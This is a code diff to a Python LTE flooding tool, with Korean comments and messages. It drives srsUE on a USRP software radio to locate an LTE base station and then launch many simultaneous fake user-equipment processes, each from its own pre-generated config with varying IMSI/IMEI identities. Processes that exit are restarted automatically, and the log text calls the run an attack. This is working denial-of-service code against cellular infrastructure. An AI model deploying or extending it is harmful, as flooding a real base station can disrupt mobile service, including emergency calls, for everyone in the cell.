@@ -28,7 +28,8 @@ class LTEFlooder:
     def __init__(self, usrp_args: str, 
                  interval: float = 0.1, srsue_config: str = "srsue.conf",
                  mcc: Optional[int] = None, mnc: Optional[int] = None,
-                 earfcn: Optional[int] = None, instances: int = 1):
+                 earfcn: Optional[int] = None, instances: int = 1,
+                 use_configs: bool = False):
         """
         Args:
             usrp_args: USRP 장치 인자 (예: "serial=30AD123")
@@ -38,6 +39,7 @@ class LTEFlooder:
             mnc: Mobile Network Code (예: 456)
             earfcn: 주파수 채널 번호 (예: 3400)
             instances: 동시에 실행할 프로세스 수 (기본값: 1)
+            use_configs: ue_configs 폴더의 모든 config 파일 사용 여부
         """
         self.usrp_args = usrp_args
         self.interval = interval
@@ -46,6 +48,7 @@ class LTEFlooder:
         self.mnc = mnc
         self.earfcn = earfcn
         self.instances = instances
+        self.use_configs = use_configs
         self.processes: list[Optional[subprocess.Popen]] = []  # 여러 프로세스 관리
         self.running = False
         
@@ -264,6 +267,19 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
     
     def generate_configs_batch(self, count: int = 500, output_dir: str = "ue_configs"):
         """대량의 config 파일을 미리 생성"""
+        import shutil
+        
+        # 기존 폴더가 있으면 비우기
+        if os.path.exists(output_dir):
+            logger.info(f"{output_dir} 폴더를 비우는 중...")
+            try:
+                shutil.rmtree(output_dir)
+            except Exception as e:
+                logger.error(f"폴더 삭제 오류: {e}")
+        
+        # 폴더 생성
+        os.makedirs(output_dir, exist_ok=True)
+        
         logger.info(f"{count}개의 config 파일을 {output_dir} 폴더에 생성 중...")
         config_files = []
         
@@ -342,6 +358,157 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
         with open(config_path, 'w') as f:
             f.write(config_content)
         return config_path
+    
+    def get_config_files(self, config_dir: str = "ue_configs") -> list[str]:
+        """ue_configs 폴더에서 모든 config 파일 목록 가져오기"""
+        config_files = []
+        if os.path.exists(config_dir) and os.path.isdir(config_dir):
+            for file in os.listdir(config_dir):
+                if file.endswith('.conf'):
+                    config_files.append(os.path.join(config_dir, file))
+        return sorted(config_files)
+    
+    def run_srsue_with_config(self, config_path: str, log_file: str = None) -> subprocess.Popen:
+        """단일 config 파일로 srsue 실행"""
+        if log_file is None:
+            log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
+        
+        cmd = [
+            "srsue",
+            config_path,
+            "--log.filename", log_file,
+            "--log.all_level", "info"
+        ]
+        
+        kwargs = {
+            'stdout': subprocess.PIPE,
+            'stderr': subprocess.PIPE,
+        }
+        if hasattr(os, 'setsid'):
+            kwargs['preexec_fn'] = os.setsid
+        elif sys.platform == 'darwin':
+            kwargs['start_new_session'] = False
+        
+        return subprocess.Popen(cmd, **kwargs)
+    
+    def run_flooding_with_configs(self):
+        """ue_configs 폴더의 모든 config 파일로 동시에 실행"""
+        # 먼저 하나의 srsue로 eNB 찾기
+        logger.info("eNB 탐색 중...")
+        scout_config = self.create_ue_config(0)
+        scout_log = "/tmp/srsue_scout.log"
+        scout_process = self.run_srsue_with_config(scout_config, scout_log)
+        
+        enb_found = False
+        start_time = time.time()
+        max_wait_time = 60  # 최대 60초 대기
+        
+        # eNB 찾기 대기
+        while self.running and not enb_found and (time.time() - start_time) < max_wait_time:
+            if scout_process.poll() is not None:
+                # 프로세스가 종료됨
+                break
+            
+            if os.path.exists(scout_log):
+                try:
+                    with open(scout_log, 'r', encoding='utf-8', errors='ignore') as f:
+                        log_content = f.read()
+                    
+                    # eNB 찾았는지 확인
+                    cell_found = any(keyword in log_content.lower() for keyword in [
+                        'found plmn',
+                        'found cell',
+                        'cell found with pci',
+                        'detected cell with pci',
+                        'synchronized to cell',
+                        'rrc connection request',
+                        'random access',
+                        'rach'
+                    ])
+                    
+                    if cell_found:
+                        enb_found = True
+                        logger.info("✓ eNB를 찾았습니다! 모든 config 파일로 동시에 공격 시작...")
+                        break
+                except:
+                    pass
+            
+            time.sleep(0.5)
+        
+        # 스카우트 프로세스 종료
+        if scout_process.poll() is None:
+            scout_process.terminate()
+            try:
+                scout_process.wait(timeout=2)
+            except:
+                scout_process.kill()
+        
+        # 스카우트 config 파일 삭제
+        if os.path.exists(scout_config):
+            try:
+                os.remove(scout_config)
+            except:
+                pass
+        
+        if not enb_found:
+            logger.warning("eNB를 찾지 못했습니다. 재시도합니다...")
+            if self.running:
+                time.sleep(1)
+                self.run_flooding_with_configs()
+            return
+        
+        # ue_configs 폴더에서 모든 config 파일 가져오기
+        config_files = self.get_config_files()
+        if not config_files:
+            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
+            return
+        
+        logger.info(f"{len(config_files)}개의 config 파일로 동시에 공격 시작...")
+        
+        # 모든 config 파일로 동시에 실행
+        all_processes = []
+        for config_path in config_files:
+            try:
+                log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
+                process = self.run_srsue_with_config(config_path, log_file)
+                all_processes.append({
+                    'process': process,
+                    'config': config_path,
+                    'log': log_file
+                })
+                self.processes.append(process)
+                # 약간의 지연 (USRP 충돌 방지)
+                time.sleep(0.01)
+            except Exception as e:
+                logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
+        
+        logger.info(f"✓ {len(all_processes)}개의 srsue 프로세스가 실행 중입니다.")
+        
+        # 모든 프로세스가 종료될 때까지 대기
+        try:
+            while self.running:
+                # 종료된 프로세스 확인
+                for proc_data in all_processes[:]:
+                    if proc_data['process'].poll() is not None:
+                        # 프로세스가 종료됨 - 재시작
+                        logger.debug(f"프로세스 종료됨: {proc_data['config']}, 재시작...")
+                        try:
+                            old_process = proc_data['process']
+                            new_process = self.run_srsue_with_config(proc_data['config'], proc_data['log'])
+                            proc_data['process'] = new_process
+                            # processes 리스트 업데이트
+                            if old_process in self.processes:
+                                idx = self.processes.index(old_process)
+                                self.processes[idx] = new_process
+                            else:
+                                self.processes.append(new_process)
+                            time.sleep(0.01)
+                        except Exception as e:
+                            logger.error(f"재시작 오류: {e}")
+                
+                time.sleep(1)
+        except KeyboardInterrupt:
+            pass
     
     def run_flooding(self):
         """srsUE 실행 (연결 성공 시 즉시 종료하여 빠른 재연결, 매번 다른 IMSI/IMEI)"""
@@ -696,8 +863,10 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
         target_str = ", ".join(target_info) if target_info else "기본 설정"
         logger.info(f"LTE Flooding 시작: 인스턴스 수: {self.instances}, 대상: {target_str}")
         
-        # 여러 인스턴스 실행 또는 단일 프로세스 실행
-        if self.instances > 1:
+        # config 파일 모드 사용 여부 확인
+        if self.use_configs:
+            self.run_flooding_with_configs()
+        elif self.instances > 1:
             self.run_multiple_instances()
         else:
             # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
@@ -822,6 +991,11 @@ def main():
         default="ue_configs",
         help="생성된 config 파일을 저장할 디렉토리 (기본값: ue_configs)"
     )
+    parser.add_argument(
+        "--use-configs",
+        action="store_true",
+        help="ue_configs 폴더의 모든 config 파일을 사용하여 동시에 공격합니다. eNB를 찾으면 모든 config 파일로 즉시 실행합니다."
+    )
     
     args = parser.parse_args()
     
@@ -832,7 +1006,8 @@ def main():
         mcc=args.mcc,
         mnc=args.mnc,
         earfcn=args.earfcn,
-        instances=args.instances
+        instances=args.instances,
+        use_configs=args.use_configs
     )
     
     # config 파일 생성 모드
